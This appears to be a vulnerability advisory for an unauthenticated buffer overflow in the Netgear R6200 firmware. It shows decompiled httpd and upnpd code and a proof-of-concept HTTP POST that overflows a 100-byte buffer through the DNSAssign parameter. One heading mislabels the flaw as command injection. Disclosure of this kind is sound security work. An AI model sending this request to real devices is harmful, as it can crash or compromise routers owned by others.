# Buffer Overflow Vulnerability in `wan_dns_sel`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6200 Router                                         |
| Firmware Version     | V1.0.1.58_1.0.44                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`blkCgi_fix`) â†’ `upnpd` (`sub_40DACC`) (cross-binary data flow via `wan_dns_sel`) |
| Prerequisites        | No authentication required; attacker must supply crafted input via web interface parameter `DNSAssign` |

2. Exploitation Path

```c
// httpd
int __fastcall blkCgi_fix(char *a1, int a2)
{
  ...
  char v21[256]; // [sp+37Ch] [-304h] BYREF
  ...
  websGetVar(a1, "DNSAssign", v21);
  acosNvramConfig_set("wan_dns_sel", v21);
  ...
}

// upnpd
int __fastcall sub_40DACC(int a1, int a2, _DWORD *a3)
{
  ...
  char v17[20]; // [sp+3Ch] [-DCh] BYREF
  char v18[100]; // [sp+50h] [-C8h] BYREF
  ...
  if ( acosNvramConfig_invmatch("ParentalControl", "1") )
  {
    v12 = (const char *)acosNvramConfig_get("wan_dns_sel");
    strcpy(v18, v12);
    ...
}
```

3. **Vulnerable Binaries:** The vulnerabilities are located in the `httpd` and `upnpd` binaries, with taint propagation occurring across these binaries.

4. 0-Day Command Injection Exploitation Path: In the `httpd` binary, the `blkCgi_fix` function at line 7 invokes `websGetVar(a1, "DNSAssign", v21)` to receive input data. Although a 255-byte length limit is enforced at this point, no additional length validation is applied. The input is then stored temporarily via `acosNvramConfig_set("wan_dns_sel", v21)` at line 8. Subsequently, in the `upnpd` binary, the `sub_40DACC` function reads this intermediate storage at line 21 through `v12 = (const char *)acosNvramConfig_get("wan_dns_sel")`. Finally, at line 22, the data is copied into the destination buffer using `strcpy(v18, v12)`, where the buffer `v18` has a size of 100 bytes, resulting in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/blkCgi_fix HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
Connection: close

DNSAssign=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```